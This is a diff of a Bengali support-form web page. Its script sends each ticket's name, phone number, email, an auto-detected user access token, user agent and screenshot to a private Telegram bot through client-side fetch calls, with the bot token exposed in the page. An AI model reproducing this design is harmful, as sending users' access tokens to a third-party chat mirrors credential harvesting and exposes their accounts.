+📌 <b>ক্যাটাগরি:</b> ${categoryName}
+
+👤 <b>ব্যবহারকারীর নাম:</b> ${escapeHtml(name)}
+📞 <b>যোগাযোগের নম্বর:</b> <code>${escapeHtml(phone)}</code>
+📧 <b>জিমেইল/ইমেইল:</b> ${escapeHtml(email)}
+🔑 <b>এক্সেস টোকেন/UID:</b> <code>${escapeHtml(token)}</code>
+
+📝 <b>সমস্যার বিবরণ:</b>
+${escapeHtml(description)}
+
+🌐 <b>ডিভাইস:</b> ${navigator.userAgent.substring(0, 100)}...
+⏰ <b>সময়:</b> ${now}
+━━━━━━━━━━━━━━━━━━━━
+<i>— আমার খামার স্মার্ট সাপোর্ট ইঞ্জিন</i>`;
+
+            // UI Loading state
+            submitBtn.disabled = true;
+            spinner.classList.remove('hidden');
+            alertBox.classList.add('hidden');
+
+            try {
+                // Step 1: Send formatted text message to Telegram
+                const textApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const textResponse = await fetch(textApiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                if (!textResponse.ok) {
+                    throw new Error("টেলিগ্রামে বার্তা পাঠাতে সমস্যা হয়েছে।");
+                }
+
+                // Step 2: If screenshot attached, send photo to Telegram
+                if (file) {
+                    const photoFormData = new FormData();
+                    photoFormData.append('chat_id', TELEGRAM_CHAT_ID);
+                    photoFormData.append('photo', file);
+                    photoFormData.append('caption', `📷 টিকেট #${ticketId}-এর স্ক্রিনশট প্রুফ (${name})`);
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: photoFormData
+                    });
+                }
+
+                // Success
+                showAlert("success", `🎉 আলহামদুলিল্লাহ! আপনার আবেদনটি সফলভাবে শুভ ভাইয়ের টেলিগ্রাম বটে পৌঁছে গেছে।<br><b>আপনার টিকেট নম্বর: #${ticketId}</b>। অতি দ্রুত সমস্যার সমাধান করে আপনার নম্বরে যোগাযোগ করা হবে।`);
+                
+                // Reset form fields
+                document.getElementById('support-form').reset();
+                document.getElementById('file-label-text').innerHTML = `<span class="font-bold text-teal-600">ছবি সিলেক্ট করুন</span> অথবা ড্র্যাগ করুন`;
+                document.getElementById('form-token-input').value = detectedUserToken;
+
+            } catch (err) {
+                console.error("Telegram send error:", err);
+                showAlert("error", "❌ আবেদন পাঠাতে সমস্যা হয়েছে! আপনার ইন্টারনেট কানেকশন চেক করে পুনরায় চেষ্টা করুন।");
+            } finally {
+                submitBtn.disabled = false;
+                spinner.classList.add('hidden');
+            }
+        }
+
+        // Helper: Alert Message Box
+        function showAlert(type, msg) {
+            const alertBox = document.getElementById('form-status-alert');
+            alertBox.classList.remove('hidden');
+            if (type === 'success') {
+                alertBox.className = "p-4 rounded-xl text-xs sm:text-sm font-semibold bg-emerald-50 text-emerald-800 border border-emerald-200/80 flex items-start gap-2 animate-fade-in";
+                alertBox.innerHTML = `<span class="material-symbols-outlined text-emerald-600 text-[20px] shrink-0">check_circle</span> <div>${msg}</div>`;
+            } else {
+                alertBox.className = "p-4 rounded-xl text-xs sm:text-sm font-semibold bg-rose-50 text-rose-800 border border-rose-200/80 flex items-start gap-2 animate-fade-in";
+                alertBox.innerHTML = `<span class="material-symbols-outlined text-rose-600 text-[20px] shrink-0">error</span> <div>${msg}</div>`;
+            }
+        }
+
+        // HTML Escape for safe Telegram HTML parsing
+        function escapeHtml(text) {
+            return (text || '').replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+        }
+    </script>
+</body>
+</html>
